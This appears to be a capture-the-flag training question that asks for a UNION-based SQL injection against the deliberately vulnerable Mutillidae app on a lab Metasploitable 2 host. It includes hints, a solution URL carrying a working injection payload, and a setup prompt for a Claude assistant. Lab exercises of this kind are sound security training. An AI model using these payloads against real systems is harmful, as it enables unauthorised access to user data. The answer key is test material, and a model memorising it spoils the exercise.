# Q079 — Mutillidae User Lookup SQLi

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `curl (or browser)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

On Mutillidae user-lookup page, use UNION-based SQLi to dump usernames. Provide a working payload.

---

## 🎯 Flag Format

```
payload=<text>
```

Example: `payload=' UNION SELECT username,password FROM accounts -- -`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Try `'` first to confirm error.
</details>

<details>
<summary>Hint 2</summary>

Adjust column count via ORDER BY.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# http://192.168.52.129/mutillidae/index.php?page=user-info.php&username=' UNION SELECT 1,2,3,4,5,6,7-- -&password=&user-info-php-submit-button=View+Account+Details
```

Dumps account info.

**Answer:** `payload=' UNION SELECT ...`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q079:
1. Verify Metasploitable2 (192.168.52.129) up; apache2+mysql up.
2. Mutillidae reachable: curl -I http://192.168.52.129/mutillidae/.
3. On first visit, click 'setup/reset the DB' link to initialize Mutillidae DB.

Report back: "Lab ready for Q079 — Mutillidae reachable with DB initialized on 192.168.52.129".
```
